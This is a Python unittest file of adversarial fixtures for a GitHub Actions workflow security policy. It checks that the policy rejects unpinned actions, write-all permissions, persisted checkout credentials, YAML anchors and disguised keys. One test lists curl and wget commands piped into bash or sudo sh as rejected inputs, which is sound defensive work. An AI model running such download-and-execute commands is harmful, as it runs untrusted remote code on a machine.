#!/usr/bin/env python3
"""Adversarial fixtures for the Actions trust policy."""

from __future__ import annotations

import importlib.util
import tempfile
import unittest
from pathlib import Path


SCRIPT = Path(__file__).with_name("check-workflow-security.py")
SPEC = importlib.util.spec_from_file_location("workflow_security", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
POLICY = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(POLICY)

PIN = "a" * 40


def workflow(body: str) -> str:
    return f"""name: policy-test
on:
  push:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
{body}
"""


class WorkflowSecurityTests(unittest.TestCase):
    def check(self, source: str) -> list[str]:
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "fixture.yml"
            path.write_text(source, encoding="utf-8")
            errors: list[str] = []
            POLICY.check_workflow(path, errors)
            return errors

    def test_remote_subdirectory_and_quoted_false_are_accepted(self) -> None:
        source = workflow(
            f"""      - uses: owner/repository/subdirectory/action@{PIN}
      - uses: actions/checkout@{PIN}
        with:
          persist-credentials: "false"
"""
        )
        self.assertEqual(self.check(source), [])

    def test_flow_trigger_and_flow_step_fail_closed(self) -> None:
        flow_trigger = workflow("      - run: true\n").replace(
            "on:\n  push:\n", "on: [push, pull_request_target]\n"
        )
        self.assertTrue(any("flow-style" in error for error in self.check(flow_trigger)))

        flow_step = workflow(f"      - uses: actions/checkout@{PIN}\n").replace(
            f"      - uses: actions/checkout@{PIN}\n",
            f"      - {{uses: owner/repository@{PIN}}}\n",
        )
        self.assertTrue(any("flow-style" in error for error in self.check(flow_step)))

    def test_checkout_truthy_values_and_missing_with_are_rejected(self) -> None:
        for value in ('"true"', "True", "yes", "ON"):
            with self.subTest(value=value):
                source = workflow(
                    f"""      - uses: actions/checkout@{PIN}
        with:
          persist-credentials: {value}
"""
                )
                errors = self.check(source)
                self.assertTrue(any("credentials" in error for error in errors), errors)

        missing = workflow(f"      - uses: actions/checkout@{PIN}\n")
        self.assertTrue(any("credentials" in error for error in self.check(missing)))

    def test_mutable_action_and_quoted_write_all_are_rejected(self) -> None:
        mutable = workflow("      - uses: owner/repository/action@main\n")
        self.assertTrue(any("40-hex" in error for error in self.check(mutable)))

        write_all = workflow("      - run: true\n").replace(
            "permissions:\n  contents: read", 'permissions: "write-all"'
        )
        self.assertTrue(any("write-all" in error for error in self.check(write_all)))

    def test_download_to_shell_variants_are_rejected(self) -> None:
        commands = (
            "curl https://example.invalid/x | bash",
            "curl https://example.invalid/x|/bin/bash",
            "wget -qO- https://example.invalid/x | /usr/bin/env bash",
            "curl https://example.invalid/x | sudo -E /bin/sh",
        )
        for command in commands:
            with self.subTest(command=command):
                source = workflow(f"      - run: {command}\n")
                errors = self.check(source)
                self.assertTrue(any("download-and-execute" in error for error in errors), errors)

    def test_yaml_indirection_is_rejected(self) -> None:
        source = workflow("      - &shared\n        run: true\n      - *shared\n")
        self.assertTrue(any("anchors" in error for error in self.check(source)))

    def test_noncanonical_mapping_keys_are_rejected(self) -> None:
        escaped = workflow(
            f'      - "u\\u0073es": owner/repository@{PIN}\n'
        )
        self.assertTrue(any("mapping keys" in error for error in self.check(escaped)))

        explicit = workflow(f"      - ? uses\n        : owner/repository@{PIN}\n")
        self.assertTrue(any("mapping keys" in error for error in self.check(explicit)))


if __name__ == "__main__":
    unittest.main()
